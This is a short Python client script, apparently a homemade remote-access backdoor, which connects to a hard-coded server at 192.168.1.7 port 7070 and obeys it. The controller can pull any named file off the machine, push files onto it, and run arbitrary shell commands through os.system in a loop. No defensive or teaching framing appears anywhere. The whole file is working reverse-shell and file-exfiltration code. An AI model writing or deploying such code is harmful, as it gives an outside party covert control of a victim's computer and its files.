import socket
import os

# GLOBALS 
HEADER = 64
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = '!disconnect'

SERVER = "192.168.1.7"
PORT = 7070
ADDR = (SERVER, PORT)
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def try_connection():
    client.connect(ADDR)

try_connection()
connection = True

# function to send files 
def send_file():
    print('sending')
    file_name = client.recv(1024).decode()

    file = open(file_name, 'rb')
    f = file.read()
    client.send(f)
    file.close()

# function to recv files
def recv_file():
    print('reciving')
    file_name = client.recv(1024).decode()
    file = client.recv(1024).decode()
    f = open(str(file_name), 'wt')
    f.write(file)
    f.close()

# function that accept and excute command prompt commands 
def cmd():
    active  = True
    while active:
        command = client.recv(1024).decode()
        # checking for commands that are not supported in os.system
        if command == 'dir':
            b = os.listdir()
        elif command[:2] == 'cd' and len(command) > 3:
            cd, di = command.split(' ')
            os.chdir(di) 
            b = 'changed'
        else:
            try :
                b = os.system(command)
            except:
                b = 1
        b = str(b)
        client.send(b.encode())
        print(b) 

# connection handler 
while connection:
    massage = client.recv(1024).decode()
    print(massage)

    # checking the commands 
    if massage == 'send':
        recv_file()
    elif massage == 'recv':
        send_file()
    elif massage == 'cmd':
        cmd()
    elif massage == 'end':
            connection = False
            break
